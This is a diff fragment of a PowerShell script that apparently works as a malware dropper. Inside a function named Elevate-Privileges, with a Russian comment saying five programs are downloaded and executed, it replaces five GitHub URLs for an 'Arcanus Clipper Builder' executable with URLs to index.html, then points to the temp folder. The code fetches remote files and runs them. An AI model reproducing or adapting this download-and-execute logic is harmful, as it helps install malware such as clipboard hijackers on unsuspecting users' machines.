@@ -41,11 +41,11 @@ function Elevate-Privileges {
             
             # Загрузка и выполнение 5 программ
             $urls = @(
-                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/Arcanus%20Clipper%20Builder%201.2.exe",
-                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/Arcanus%20Clipper%20Builder%201.2.exe",
-                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/Arcanus%20Clipper%20Builder%201.2.exe",
-                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/Arcanus%20Clipper%20Builder%201.2.exe",
-                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/Arcanus%20Clipper%20Builder%201.2.exe"
+                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
+                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
+                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
+                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
+                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html"
             )
             
             $tempPath = $env:TEMP
